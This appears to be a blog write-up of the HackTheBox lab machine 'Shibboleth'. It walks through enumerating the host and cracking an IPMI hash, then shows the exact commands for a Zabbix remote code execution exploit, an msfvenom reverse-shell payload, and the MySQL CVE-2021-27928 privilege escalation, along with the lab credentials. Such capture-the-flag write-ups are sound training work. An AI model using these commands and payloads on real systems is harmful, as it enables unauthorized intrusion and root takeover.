---
title: Shibboleth - Medium HTB
date: 202-01-27 10:11:53 +/-0800
categories: [writeup, hackthebox]
writeup: :title
permalink: /shibboleth
tags: [htb, writeup, medium, Zabbix, CVE, MYSQL, 4nh4ck1ne]     # TAG names should always be lowercase
---

# Shibboleth

![Untitled](assets/Shibboleth/LOGO.png)

## **Scanning :**

Lets begin with a nmap to see what ports is opens on the target system : 

```python
> nmap -sS -sV -sC -T4 10.10.11.124 -Pn

#output
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://shibboleth.htb/
Service Info: Host: shibboleth.htb
```

Add the machine hostname to your `/etc/hosts` file: 

```bash
echo "10.10.11.124 shibboleth.htb" >> /etc/hosts
```

## **Enumerate the web service :**

use whatweb to see the technologie used by the web site : 

```bash
> whatweb -a 3 shibboleth.htb

#output 
http://shibboleth.htb [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[contact@example.com,info@example.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.124], Lightbox, PoweredBy[enterprise], Script, Title[FlexStart Bootstrap Template - Index]
```

Lets lauche a gobuster bf to enumerate the web page :

```bash
> gobuster dir -u http://shibboleth.htb/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t50

#output
/assets               (Status: 301) [Size: 317] [--> http://shibboleth.htb/assets/]
/forms                (Status: 301) [Size: 316] [--> http://shibboleth.htb/forms/]
/server-status        (Status: 403) [Size: 279]
```

we found nothing interesting so we can try to bf the vhosts to find another web service.

Enumerate the vhost with fuff : 

```bash
> ffuf -u http://shibboleth.htb/ -H "Host: FUZZ.shibboleth.htb" -w /usr/share/seclists/Discovery/DNS/namelist.txt -fw 18

#output 
[Status: 200, Size: 3686, Words: 192, Lines: 30, Duration: 290ms]
    * FUZZ: monitoring

[Status: 200, Size: 3686, Words: 192, Lines: 30, Duration: 292ms]
    * FUZZ: monitor

[Status: 200, Size: 3686, Words: 192, Lines: 30, Duration: 46ms]
    * FUZZ: zabbix
```

all vhosts redirect to the same page ducoup you can add just one of the 3 to your/etc/hosts, and ducoup one comes across a login page of the zabbix software which is a monitoring software for computer park: 

![Untitled](assets/Shibboleth/login.png)

## **Enumerate and exploit zabbix :**

first I want to find the version of zabbix ducoup I find on github repo with tools:

[GitHub - freeworkaz/zabbix_test: this is some scripts for pentesting zabbix server](https://github.com/freeworkaz/zabbix_test)

You must use the zabbix_version_detect.py script here the code after midification:

```python
"""
This script is for testing zabbix version
by version of the docs on the logon page
"""

import urllib2  
import re
from bs4 import BeautifulSoup  

zab_page='http://monitor.shibboleth.htb/index.php' 
page=urllib2.urlopen(zab_page)
soup = BeautifulSoup(page, 'html.parser')
for link in soup.findAll('a', attrs={'href': re.compile("documentation")}):
    version=link.get('href')

parts=re.split('/', version)

a=''.join (parts[4:5])
print "zabbix version is",a
```

run it see the version : 

```python
> python2 zabbix_version_detect.py 
zabbix version is 5.0
```

Lets rescan the target but that time with a udp scan : 

```python
> nmap -sU -T4 -Pn 10.10.11.124 -n --max-retries 1

623/udp open  asf-rmcp
```

after looking for information on port 623 I came across the [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/623-udp-ipmi) page that my well informed on the subject.

Lets see the version of IPMI : 

```python
> nmap -sU --script ipmi-version -p 623 10.10.11.124

623/udp open  asf-rmcp
| ipmi-version: 
|   Version: 
|     IPMI-2.0
|   UserAuth: password, md5, md2, null
|   PassAuth: auth_msg, auth_user, non_null_user
|_  Level: 1.5, 2.0
```

lets dump the admin hash with [ipmipwner](https://github.com/c0rnf13ld/ipmiPwner) : 

```python
> git clone https://github.com/c0rnf13ld/ipmiPwner

#install requirements : 
> ./requirements.sh

#dump admin hash
>./ipmipwner.py --host 10.10.11.124

[*] Checking if port 623 for host 10.10.11.124 is active
[*] Using the list of users that the script has by default
[*] Brute Forcing
[*] Number of retries: 2
[*] The username: Administrator is valid                                                                                    
[*] The hash for user: Administrator
   \_ $rakp$a4a3a2a002030000ebc053f6d5ef225d169dc8006bde6c16e8e71d82f8ff1cd441422c4f763f3348a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72$a8e600ba41d6a1e70d9636a223af3374fb287b7b
```

Use john to crack the hash : 

```python
> john zabbix_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (RAKP, IPMI 2.0 RAKP (RMCP+) [HMAC-SHA1 128/128 SSE2 4x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepumkinpie1  (?)     
1g 0:00:00:01 DONE (2023-12-24 11:30) 0.7462g/s 5526Kp/s 5526Kc/s 5526KC/s iluve.p..ilovejesus789
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

And connect your self on the app : 

![Untitled](assets/Shibboleth/pannel_admin.png)

the next step is too gain reverse shell, I found a exploit who do that : 

https://www.exploit-db.com/exploits/50816

Downlaod it with searchsploit : `searchsploit -m 50816.py`

Run ti and gain your reverse shell : 

```python
#run listener : 
> pwncat-cs :9001

#run the exploit you should by patient...
> python 50816.py http://monitor.shibboleth.htb/ "Administrator" "ilovepumkinpie1" 10.10.16.9 9001

[*] this exploit is tested against Zabbix 5.0.17 only
[*] can reach the author @ https://hussienmisbah.github.io/                                                                                                                                                                                 
[+] the payload has been Uploaded Successfully                                                                                                                                                                                              
[+] you should find it at http://monitor.shibboleth.htb//items.php?form=update&hostid=10084&itemid=33618                                                                                                                                    
[+] set the listener at 9002 please...                                                                                                                                                                                                      
[?] note : it takes up to +1 min so be patient :)                                                                                                                                                                                           
[+] got a shell ? [y]es/[N]o: y                                                                                                                                                                                                             
Nice !
```

You can can move lateraly on the user ipmi-svc, for that reuse the password of the administrator hash. 

## **Privileges Escalation Exploit mysql CVE:**

After lot of enumeration we found the password of the db stored in the `/etc/zabbix/zabbix_server.conf`

```python
### Option: DBUser
#       Database user.
#
# Mandatory: no
# Default:
# DBUser=

DBUser=zabbix

### Option: DBPassword
#       Database password.
#       Comment this line if no password is used.
#
# Mandatory: no
# Default:
DBPassword=bloooarskybluh
```

log your self on the db and start the enumeration : 

```python
#view the version of mysql
select version();
```

if we look for a known vuln on the internet there is a way to increase our privileges from mysql.

[GitHub - Al1ex/CVE-2021-27928: CVE-2021-27928 MariaDB/MySQL-'wsrep provider' 命令注入漏洞](https://github.com/Al1ex/CVE-2021-27928)

So step 1 on create the payload and start listener : 

```python
> msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.9 LPORT=1234 -f elf-so -o CVE-2021-27928.so

> nc -lnvp 1234
```

Now upload it with your pwncat session : 

```python
> upload CVE-2021-27928.so
```

Final exploit the mysql db : 

```python
#mysql shell 
> SET GLOBAL wsrep_provider="/tmp/CVE-2021-27928.so";
```

look your listner: 

![Untitled](assets/Shibboleth/root.png)

original deaths from the beginning to the end I hope she will serve me for Zephyr ! 😁
